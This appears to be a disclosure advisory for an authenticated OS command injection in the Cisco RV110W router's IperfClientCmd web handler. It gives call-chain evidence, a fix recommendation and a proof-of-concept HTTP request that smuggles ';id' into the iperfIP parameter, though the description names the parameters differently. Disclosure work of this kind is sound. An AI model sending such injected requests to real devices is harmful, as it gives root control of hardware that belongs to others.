# Cisco RV110W IperfClientCmd OS Command Injection

## Basic Information

| Field | Value |
|-------|-------|
| **VulnDB ID** | (Pending Assignment) |
| **CVE ID** | (Pending Assignment) |
| **CWE** | CWE-78 |
| **CVSS 3.1** | 8.8 (High) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| **Type** | OS Command Injection |
| **Internal ID** | FRV-CISCO-RV110W-001 |

## Affected Product

| Field | Value |
|-------|-------|
| **Vendor** | Cisco Systems |
| **Product** | RV110W Wireless-N VPN Firewall |
| **Version** | Firmware <= 1.2.1.7 (EOL) |
| **Binary** | /usr/sbin/httpd |
| **Architecture** | MIPS32 Little-Endian |
| **Function** | IperfClientCmd @ 0x414e78 |

## Description

An OS command injection vulnerability exists in the IperfClientCmd function (0x414e78) of httpd in Cisco RV110W firmware <= 1.2.1.7. The function reads 6 HTTP parameters via get_cgi() (sys_iperfIP, sys_iperfTime, sys_iperfPort, sys_iperfInterval, sys_iperfWinSize, sys_iperfMode) and concatenates them via sprintf() into a shell command passed directly to system() without sanitization.

Constructed command: `iperf -c <IP> -t <Time> -p <Port> -i <Interval> -w <WinSize> -fm <Mode> > /tmp/result.txt`

An authenticated attacker can inject arbitrary OS commands through any of the 6 parameters.

## Proof of Concept

```http
POST /apply.cgi HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded
Cookie: <valid_session>

submit_button=Diagnostics&change_action=gozila_cgi&submit_type=IperfClientCmd&iperfIP=;id&iperfTime=10&iperfPort=5001&iperfInterval=1&iperfWinSize=8K&iperfMode=m
```

## Technical Evidence

- **Source**: get_cgi() @ 0x41a534 — reads 6 HTTP parameters
- **Sink**: system() @ PLT 0x500310
- **Call chain**: get_cgi → sprintf → system
- **Verification**: angr symbolic execution confirmed tainted data reaches system() after 73 steps through 72 basic blocks
- **No known CVE covers this function** (CVE-2019-1663 is buffer overflow in login, CVE-2022-20900 is different function)

## Impact

Authenticated attacker can execute arbitrary OS commands as root, gaining full control of the device.

## Fix Recommendation

Replace system() with execve(). Validate all 6 parameters as numeric/IP format only. Filter shell metacharacters.

## Discovery

| Field | Value |
|-------|-------|
| **Method** | FirmRec Cross-Firmware Genetic Vulnerability Mining |
| **Date** | 2026-03-22 |
| **Discoverer** | ST4R |
| **Verification** | angr symbolic execution — VULN (73 steps to system()) |
| **Status** | CONFIRMED |

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-03-22 | Vulnerability discovered via FirmRec automated pipeline |
| TBD | Vendor notification |
| TBD | CVE ID assigned |
| TBD | Public disclosure (+90 days) |

---
*Discovered via FirmRec — IoT Firmware Genetic Vulnerability Mining Framework*
